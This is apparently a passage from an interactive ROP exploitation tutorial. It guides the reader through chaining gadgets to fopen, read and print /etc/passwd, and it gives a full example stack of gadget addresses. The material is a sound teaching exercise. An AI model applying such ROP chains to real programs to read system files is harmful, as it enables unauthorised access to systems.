We have all the pieces we need to do something really cool - let's chain
together a whole bunch of functions!

Your goal in this tutorial is to print the contents of the `/etc/passwd` file.
We've created a bunch of helper functions, normally you'd have to find these
yourself!

First, open the file:

* Call `get_etc_passwd()`, which will return a pointer to that string in `rax`,
  then move that pointer to `rdi` (first argument to `fopen()`)
* Call `get_r()`, which returns a pointer to the letter `r`, and move that
  pointer to `rsi` (second argument to `fopen()`)
* Call `fopen`, with `rdi` and `rsi` hopefully set correctly

You can run it here and make sure the `fopen()` parameters look right (it will,
of course, crash, if you don't do a clean exit - that's fine).

If everything looks good so far, the next step is to set up the three
parameters to `fgets()` (remember that you can mouseover `fgets()` to see what
the parameters mean!):

* Set `fgets()`'s `stream` parameter (`rdx`) to the return value from
  `fopen()` (`mov rdx, rax / ret`)
* Set `fgets()`'s `buf` parameter (`rdi`) to the return value from
  `get_writable_memory()` (`get_writable_memory()` / `mov rdi, rax / ret`)
* Set `fgets()`'s `size` parameter (`rsi`) to some value around 1000
  (`pop rsi / ret` / `1000`)
* Call `fgets()` to read from the file

Again, you can stop here and make sure the call to `fgets()` looks correct.

If everything has worked correctly, the buffer that `get_writable_memory()`
returns should contain the data read from `/etc/passwd`. We can print it just
like last tutorial:

* Call `get_writable_memory()`
* Move the return value `rax` to the first parameter `rdi` (`mov rdi, rax / ret`)
* Call `puts()`

And you should exit cleanly, because why not?

* `pop rdi / ret` (with the value set to `0`)
* `exit()`

Your values might be a little different, particularly the memory addresses, but
here's what my stack looked like:

```
Hex (little endian)    Hex (original)    Desc
-------------------    --------------    ----
fd52555555550000       0x5555555552fd    get_etc_passwd()
0800371300000000       0x13370008        mov rdi, rax / ret
1753555555550000       0x555555555317    get_letter_r()
0c00371300000000       0x1337000c        mov rsi, rax / ret
406ce4f7ff7f0000       0x7ffff7e46c40    fopen(path, mode)
1000371300000000       0x13370010        mov rdx, rax / ret
f052555555550000       0x5555555552f0    get_writable_memory()
0800371300000000       0x13370008        mov rdi, rax / ret
0200371300000000       0x13370002        pop rsi / ret
e803000000000000       0x3e8             Constant (consumed by pop): 1000
a069e4f7ff7f0000       0x7ffff7e469a0    fgets(buf, size, stream)
f052555555550000       0x5555555552f0    get_writable_memory()
0800371300000000       0x13370008        mov rdi, rax / ret
9083e4f7ff7f0000       0x7ffff7e48390    puts(s)
0000371300000000       0x13370000        pop rdi / ret
0000000000000000       0x0               Constant (consumed by pop): 0
10e2e0f7ff7f0000       0x7ffff7e0e210    exit(code)
```
